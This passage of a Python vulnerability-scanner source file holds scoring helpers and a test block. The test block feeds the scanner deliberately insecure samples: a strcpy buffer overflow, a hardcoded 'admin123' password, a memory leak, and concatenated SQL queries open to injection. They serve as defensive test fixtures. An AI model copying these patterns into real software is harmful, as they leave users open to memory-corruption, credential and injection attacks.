            type_counts.append(f"{len(report.injection_vulnerabilities)} injection")
        if report.authentication_issues:
            type_counts.append(f"{len(report.authentication_issues)} authentication")
        
        if type_counts:
            summary_parts.append(f"Vulnerability types: {', '.join(type_counts)}")
        
        summary_parts.append(f"Exploit potential: {report.exploit_potential}")
        
        return "\n".join(summary_parts)
    
    def _calculate_overall_confidence(self, report: VulnerabilityReport) -> float:
        """Calculate overall confidence score"""
        all_vulns = (
            report.memory_vulnerabilities +
            report.injection_vulnerabilities +
            report.authentication_issues +
            report.cryptographic_weaknesses
        )
        
        if not all_vulns:
            return 1.0  # High confidence in "no vulnerabilities found"
        
        confidence_scores = [vuln.confidence for vuln in all_vulns]
        return sum(confidence_scores) / len(confidence_scores)


# Example usage and testing
if __name__ == "__main__":
    # Configure logging
    logging.basicConfig(level=logging.INFO)
    
    # Test code samples
    test_c_code = """
    #include <stdio.h>
    #include <string.h>
    
    void vulnerable_function(char* user_input) {
        char buffer[100];
        strcpy(buffer, user_input);  // Buffer overflow
        printf("Input: %s\\n", buffer);
    }
    
    int authenticate(char* password) {
        if (strcmp(password, "admin123") == 0) {  // Hardcoded password
            return 1;
        }
        return 0;
    }
    
    void memory_leak() {
        char* ptr = malloc(100);
        // Missing free(ptr)
    }
    """
    
    test_sql_code = """
    def login(username, password):
        query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
        cursor.execute(query)  # SQL injection
        return cursor.fetchone()
    
    def get_user_data(user_id):
        query = f"SELECT * FROM users WHERE id={user_id}"  # SQL injection
        return db.execute(query)
    """
    
    # Initialize engine
    engine = VulnerabilityDiscoveryEngine()
    
    # Test C code analysis
    print("=== Testing C Code Analysis ===")
    c_report = engine.analyze_code(test_c_code, "test.c", "c")
    print(f"C Code Analysis Results:")
    print(f"Total vulnerabilities: {c_report.total_vulnerabilities}")
    print(f"Critical: {c_report.critical_count}, High: {c_report.high_count}")
    print(f"Summary: {c_report.summary}")
    print()
    
    # Test SQL code analysis
    print("=== Testing SQL Code Analysis ===")
    sql_report = engine.analyze_code(test_sql_code, "test.py", "python")
    print(f"SQL Code Analysis Results:")
    print(f"Total vulnerabilities: {sql_report.total_vulnerabilities}")
    print(f"Critical: {sql_report.critical_count}, High: {sql_report.high_count}")
    print(f"Summary: {sql_report.summary}")
    
    print("\nVulnerability Discovery Engine testing completed!")